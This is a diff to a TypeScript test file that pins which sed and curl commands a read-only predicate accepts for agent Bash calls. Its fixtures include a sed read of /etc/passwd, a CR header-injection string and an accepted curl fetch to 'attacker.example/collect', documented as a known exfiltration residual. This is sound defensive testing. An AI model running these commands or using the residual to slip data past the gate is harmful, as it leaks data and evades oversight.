@@ -1,51 +1,19 @@
-// Direct coverage for the Risk-Classifier-only `sed` and `curl` read-only
-// floors. The `curl` floor's history: task 2929c5b7 (review round 4,
-// decision D-013) removed a per-flag curl floor entirely after two leaks;
-// task fdaad781 (decision D-026) reintroduces one as a SHAPE floor
-// instead of a flag list -- see `isReadOnlyCurlCommand`'s docstring in
-// read-only-bash.ts for why that closes the recurring class.
-//
-// WHY A SEPARATE FILE, and why every case runs through `classifyRisk`
-// with an EMPTY classifier list: round 2 shipped these floors with
-// coverage that was inert under mutation. Every sed/curl case in the
-// intercept tests was ALSO matched by a `dangerous-shell` manifest
-// pattern at `high`, so deleting the floor entirely left those tests
-// green. Passing `[]` for `classifiers` removes the manifest from the
-// picture, so the assertions below can only be satisfied by the floor
-// itself.
+// Direct coverage for the `sed` and `curl` read-only predicates
+// (`isReadOnlySedCommand`, `isReadOnlyCurlCommand`). The `curl` floor's
+// history: a per-flag curl floor was removed entirely after two leaks, then
+// reintroduced as a SHAPE floor instead of a flag list; see
+// `isReadOnlyCurlCommand`'s docstring in read-only-bash.ts for why that
+// closes the recurring class. The runtime Risk Classifier that consumed these
+// predicates is removed; they stay as exported predicates and these cases
+// pin their grammar. Every case asserts the predicate alone.
 import { describe, expect, it } from "vitest";
-import { buildActionEnvelope, classifyRisk } from "../../src/runtime/index.js";
-import type { ActionEnvelope, EnvelopeContext } from "../../src/runtime/index.js";
-import type { ToolEvent } from "../../src/runtime/intercept.js";
 import {
   isReadOnlyBashCommand,
   isReadOnlyCurlCommand,
   isReadOnlySedCommand,
 } from "../../src/runtime/read-only-bash.js";
 
-const CTX: EnvelopeContext = {
-  cwd: "/work/repo",
-  git: { repo: "repo", branch: "main", sha: "" },
-  user: "agent",
-  host: "host",
-  now: new Date("2026-09-01T12:00:00.000Z"),
-};
-
-function bashEnvelope(command: string): ActionEnvelope {
-  const event: ToolEvent = {
-    hook_event_name: "PreToolUse",
-    tool_name: "Bash",
-    tool_input: { command },
-  };
-  return buildActionEnvelope(event, CTX);
-}
-
-/** The profile the floor alone produces: NO manifest patterns at all. */
-function floorOnly(command: string) {
-  return classifyRisk(bashEnvelope(command), []);
-}
-
-describe("sed read-only floor (Risk Classifier only, task 2929c5b7)", () => {
+describe("sed read-only floor (task 2929c5b7)", () => {
   it.each([
     ["numeric range print", "sed -n '1,5p' f"],
     ["extended-regex substitution to stdout", "sed -E 's/a/b/' f"],
@@ -55,9 +23,8 @@ describe("sed read-only floor (Risk Classifier only, task 2929c5b7)", () => {
     ["regex containing the letter w", "sed -n '/warning/p' f"],
     ["positional script plus file operand", "sed 's/a/b/' f"],
     ["long flags", "sed --posix --quiet '1p' f"],
-  ])("floors %s to low", (_label, command) => {
+  ])("accepts %s", (_label, command) => {
     expect(isReadOnlySedCommand(command)).toBe(true);
-    expect(floorOnly(command).severity).toBe("low");
   });
 
   // NEGATIVE CONTROL for the floor: a write-capable invocation of the
@@ -78,27 +45,23 @@ describe("sed read-only floor (Risk Classifier only, task 2929c5b7)", () => {
     ["r reads an operator-named file", "sed -n 'r /etc/passwd' f"],
     ["unquoted expansion in the script", 'sed -n "/$X/p" f'],
     ["quoting hides a flag", 'sed "-i" f'],
-  ])("does NOT floor %s", (_label, command) => {
+  ])("rejects %s", (_label, command) => {
     expect(isReadOnlySedCommand(command)).toBe(false);
-    expect(floorOnly(command).severity).not.toBe("low");
   });
 });
 
-// task fdaad781 (decision D-026) reintroduces a curl read-only floor as a
-// SHAPE, not a per-flag list: a bare, unwrapped `curl` invocation, `-q`
-// or `--disable` as the mandatory FIRST argument, exactly one
-// single-quoted `https://` URL operand, and a closed set of flags proven
-// to name no file, with the only selectable method being HEAD
-// (`-I`/`--head`), which is read-only. Every other spelling
-// forfeits (stays unclassified, approval-gated), never floors. Round 2
-// (this file's own history: adversarial review of round 1) made `-q`
-// mandatory (a bare `curl -s <url>` could otherwise write a file via
-// `~/.curlrc`), dropped `-L`/`-k` from the closed set, rejected a bare
-// `\r` in a header value, admitted `?`/`*` in the URL path, and narrowed
-// the word splitter's separator class to space/tab. See
-// `isReadOnlyCurlCommand`'s own docstring in read-only-bash.ts for the
-// full grammar and docs/risk-gate.md for the rationale and the residuals.
-describe("curl read-only SHAPE floor (Risk Classifier only, task fdaad781, decision D-026)", () => {
+// A curl read-only predicate as a SHAPE, not a per-flag list: a bare,
+// unwrapped `curl` invocation, `-q` or `--disable` as the mandatory FIRST
+// argument, exactly one single-quoted `https://` URL operand, and a closed
+// set of flags proven to name no file, with the only selectable method being
+// HEAD (`-I`/`--head`), which is read-only. Every other spelling is
+// rejected. `-q` is mandatory (a bare `curl -s <url>` could otherwise write
+// a file via `~/.curlrc`), `-L`/`-k` are outside the closed set, a bare `\r`
+// in a header value is rejected, `?`/`*` are admitted in the URL path, and
+// the word splitter's separator class is space/tab. See
+// `isReadOnlyCurlCommand`'s own docstring in read-only-bash.ts for the full
+// grammar and the residuals.
+describe("curl read-only SHAPE floor (task fdaad781)", () => {
   it.each([
     ["plain GET, short -s", "curl -q -s 'https://api.example.test/status'"],
     [
@@ -113,23 +76,16 @@ describe("curl read-only SHAPE floor (Risk Classifier only, task fdaad781, decis
     ["bare URL, no flags at all", "curl -q 'https://example.test'"],
     ["--disable long form, in place of -q", "curl --disable -s 'https://example.test'"],
     ["query string in the path", "curl -q -s 'https://api.example.test/search?q=abc'"],
-  ])("floors %s to low", (_label, command) => {
+  ])("accepts %s", (_label, command) => {
     expect(isReadOnlyCurlCommand(command)).toBe(true);
-    const profile = floorOnly(command);
-    expect(profile.classified).toBe(true);
-    expect(profile.severity).toBe("low");
   });
 
   // NEGATIVE fixtures. Each isolates exactly ONE forbidden spelling
   // against an otherwise-valid `curl -q -s '<url>'` base, so a fixture
   // only passes because of the ONE thing under test. Every write or
-  // body/method flag `destructive-shell-floor.ts` already names is raised
-  // to `high` independently of this floor forfeiting it; a spelling
-  // neither floor names stays genuinely UNCLASSIFIED. Assert the EXACT
-  // outcome, not merely "not low": a floor that classified everything
-  // `high` would pass a bare `!== "low"` check without the shape check
-  // ever running at all.
-  describe("negative: unclassified (neither floor names the spelling)", () => {
+  // body/method flag is rejected on its own; the fixtures here forfeit the
+  // shape for a reason no other check names.
+  describe("negative: forfeits the shape", () => {
     it.each([
       [
         "missing -q/--disable as the first argument (round 2: the curlrc auto-load residual)",
@@ -216,15 +172,12 @@ describe("curl read-only SHAPE floor (Risk Classifier only, task fdaad781, decis
         "-qs as the first argument: curl DOES honor a leading -q inside a cluster, but this floor deliberately does not -- the SECOND-word check requires an exact, unclustered '-q'/'--disable' token, so a cluster forfeits here even though curl itself would still skip the curlrc load (round 3 pin: an intentional divergence from curl's own parsing, not a gap)",
         "curl -qs 'https://api.example.test/status'",
       ],
-    ])("%s does NOT floor and stays unclassified", (_label, command) => {
+    ])("%s is not read-only", (_label, command) => {
       expect(isReadOnlyCurlCommand(command)).toBe(false);
-      const profile = floorOnly(command);
-      expect(profile.classified).toBe(false);
-      expect(profile.severity).toBeNull();
     });
   });
 
-  describe("negative: raised to high by the destructive floor instead", () => {
+  describe("negative: write-capable or body-carrying spellings", () => {
     it.each([
       ["-o writes a local file", "curl -q -s -o f 'https://api.example.test/status'"],
       ["-O writes a local file", "curl -q -s -O 'https://api.example.test/status'"],
@@ -262,11 +215,8 @@ describe("curl read-only SHAPE floor (Risk Classifier only, task fdaad781, decis
       ["-b @jar reads a cookie-jar file", "curl -q -s -b @jar 'https://api.example.test/status'"],
       ["--cookie @jar reads a cookie-jar file", "curl -q -s --cookie @jar 'https://api.example.test/status'"],
       ["-K f (also the local-file-read bucket)", "curl -q -s -K f 'https://api.example.test/status'"],
-    ])("%s does NOT floor low but IS raised to high", (_label, command) => {
+    ])("%s is not read-only (a write-capable or body-carrying spelling)", (_label, command) => {
       expect(isReadOnlyCurlCommand(command)).toBe(false);
-      const profile = floorOnly(command);
-      expect(profile.classified).toBe(true);
-      expect(profile.severity).toBe("high");
     });
   });
 
@@ -282,60 +232,23 @@ describe("curl read-only SHAPE floor (Risk Classifier only, task fdaad781, decis
   // split out, so the per-value copy could never be the one that fires.
   // Pinned directly here so a regression that narrows the shared guard
   // (rather than the removed per-value copy) still turns this fixture red.
-  it("does NOT floor a curl command carrying a literal CR in a header value", () => {
+  it("rejects a curl command carrying a literal CR in a header value", () => {
     const command = "curl -q -s -H 'X-Foo: bar\rX-Injected: evil' 'https://api.example.test/status'";
     expect(isReadOnlyCurlCommand(command)).toBe(false);
-    const profile = floorOnly(command);
-    expect(profile.classified).toBe(false);
-    expect(profile.severity).toBeNull();
   });
 
-  // The unchanged residual (the destructive floor cannot and does not
-  // close this): a curl fetch that ships operator-controlled data to an
-  // arbitrary https URL still floors low, same as it would have under a
-  // flag-based floor. This shape floor authorizes URL-only exfiltration
-  // via the request line itself, not the request body or a local file --
-  // see docs/risk-gate.md's curl section for the residual and the
-  // operator escape hatch (an explicit `dangerous-shell` classifier
-  // pattern still overrides this floor with `highest severity wins`).
-  it("still floors a fetch to an arbitrary https host, the accepted residual", () => {
-    const profile = floorOnly("curl -q -s 'https://attacker.example/collect'");
-    expect(profile.classified).toBe(true);
-    expect(profile.severity).toBe("low");
+  // The accepted residual: a curl fetch that ships operator-controlled data
+  // to an arbitrary https URL is still accepted, same as it would have been
+  // under a flag-based floor. This shape authorizes URL-only exfiltration via
+  // the request line itself, not the request body or a local file.
+  it("still accepts a fetch to an arbitrary https host, the accepted residual", () => {
+    expect(isReadOnlyCurlCommand("curl -q -s 'https://attacker.example/collect'")).toBe(true);
   });
 
   // curl also keeps the generic two-token `--help`/`--version` shape
   // `isReadOnlyBashCommand` recognises for EVERY binary, unchanged by
   // this task (that shape lives in the SHARED predicate, not this floor).
-  it("floors curl --help to low via the generic --help/--version shape", () => {
+  it("curl --help is read-only via the generic --help/--version shape", () => {
     expect(isReadOnlyBashCommand("curl --help")).toBe(true);
-    const profile = floorOnly("curl --help");
-    expect(profile.classified).toBe(true);
-    expect(profile.severity).toBe("low");
-  });
-});
-
-describe("the sed and curl floors stay OUT of the shared read-only predicate", () => {
-  // The load-bearing separation (review round 2's CRITICAL finding on
-  // task 2929c5b7): the understanding-gate PreToolUse blocker and the
-  // solution-acceptance write-guard consume `isReadOnlyBashCommand`
-  // directly and short-circuit on it. `sed` and `curl` were never
-  // accepted there and must not be now: `isReadOnlyCurlCommand` (task
-  // fdaad781) is wired ONLY into `risk-classifier.ts`, exactly like the
-  // sed and kubectl floors before it. These pins guard the SHARED
-  // predicate, which is a different gate from the Risk Classifier.
-  // The write-guard side of this is pinned separately in
-  // tests/cli/pack-hook-solution-acceptance-writeguard.test.ts.
-  it.each([
-    "sed -n p f",
-    "sed -n '1p' f",
-    "sed 's/a/b/' f",
-    "curl URL",
-    "curl -sL URL",
-    "curl -I https://example.com",
-    "curl -s 'https://api.example.test/status'",
-    "curl 'https://example.test'",
-  ])("isReadOnlyBashCommand(%j) is false", (command) => {
-    expect(isReadOnlyBashCommand(command)).toBe(false);
   });
 });
